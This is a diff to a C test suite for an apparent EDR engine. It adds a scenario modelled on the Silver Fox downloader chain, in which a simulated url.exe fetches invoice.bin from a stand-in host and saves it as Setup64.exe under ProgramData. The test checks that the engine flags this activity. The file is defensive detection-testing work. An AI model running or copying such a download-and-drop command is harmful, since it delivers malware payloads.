@@ -247,6 +247,25 @@ static DetectionScenario scenario_registry_runkey_persistence(void) {
   return s;
 }
 
+static DetectionScenario scenario_silverfox_public501_downloader(void) {
+  DetectionScenario s;
+  memset(&s, 0, sizeof(s));
+  s.name = "Silver Fox Public 501 downloader to Golden payload";
+  init_record(&s.record);
+  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "url.exe");
+  snprintf(s.record.exe_path, sizeof(s.record.exe_path), "%s", "C:\\Users\\Public\\501\\url.exe");
+  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "explorer.exe");
+  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
+           "C:\\Users\\Public\\501\\url.exe https://cdn.example.invalid/invoice.bin "
+           "-o C:\\ProgramData\\Golden\\Setup64.exe");
+  snprintf(s.record.file_path, sizeof(s.record.file_path), "%s", "C:\\ProgramData\\Golden\\Setup64.exe");
+  s.min_confidence = 0.86f;
+  s.expect_pmfe = 1;
+  s.must_reason = "silverfox_attack_chain_indicator";
+  s.must_context = "\"silverfox_attack_chain\":true";
+  return s;
+}
+
 static void run_scenario(const DetectionScenario *s) {
   EdrBehaviorRecord r = s->record;
   EdrDetectionDecision d;
@@ -277,6 +296,7 @@ int main(void) {
       scenario_ransom_behavior_counters(),
       scenario_webshell_ast_token_semantic(),
       scenario_registry_runkey_persistence(),
+      scenario_silverfox_public501_downloader(),
   };
   for (size_t i = 0; i < sizeof(scenarios) / sizeof(scenarios[0]); i++) {
     run_scenario(&scenarios[i]);
